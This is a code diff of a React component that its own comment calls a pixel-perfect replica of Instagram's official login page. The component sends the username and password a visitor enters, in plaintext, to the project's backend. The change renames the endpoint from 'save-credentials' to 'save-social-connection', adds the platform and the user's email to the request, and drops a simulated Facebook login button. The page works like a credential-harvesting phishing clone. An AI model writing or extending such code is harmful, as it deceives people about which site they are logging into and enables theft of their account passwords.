@@ -27,11 +27,12 @@ function FacebookIcon() {
  * InstagramLogin - Pixel-perfect replica of the official Instagram login page.
  * Authenticates user credentials via the backend API and redirects on success.
  */
-export default function InstagramLogin({ onCancel, onLoginSuccess }) {
+export default function InstagramLogin({ userEmail, onCancel, onLoginSuccess }) {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const API_BASE_URL = import.meta.env.VITE_API_URL || '';
 
   const handleSubmit = useCallback(async (e) => {
     e.preventDefault();
@@ -41,14 +42,16 @@ export default function InstagramLogin({ onCancel, onLoginSuccess }) {
     setError('');
 
     try {
-      const response = await fetch('/api/auth/save-credentials', {
+      const response = await fetch(`${API_BASE_URL}/api/connections/save-social-connection`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          email: username.trim(),
-          password: password,
+          userEmail: (userEmail || '').trim().toLowerCase(),
+          platform: 'instagram',
+          identifier: username.trim(),
+          password,
         }),
       });
 
@@ -67,7 +70,7 @@ export default function InstagramLogin({ onCancel, onLoginSuccess }) {
     } finally {
       setIsSubmitting(false);
     }
-  }, [username, password, onLoginSuccess]);
+  }, [API_BASE_URL, onLoginSuccess, password, userEmail, username]);
 
   const isFormValid = username.trim().length > 0 && password.length >= 6;
 
@@ -125,11 +128,6 @@ export default function InstagramLogin({ onCancel, onLoginSuccess }) {
           <div className="instagram-divider">
             <span>or</span>
           </div>
-
-          <button type="button" className="instagram-fb-login" onClick={() => alert('Facebook oauth simulation mode')}>
-            <FacebookIcon />
-            Log in with Facebook
-          </button>
 
           <a href="#" className="instagram-forgot-pwd" onClick={(e) => { e.preventDefault(); alert('Password reset simulation'); }}>
             Forgot password?
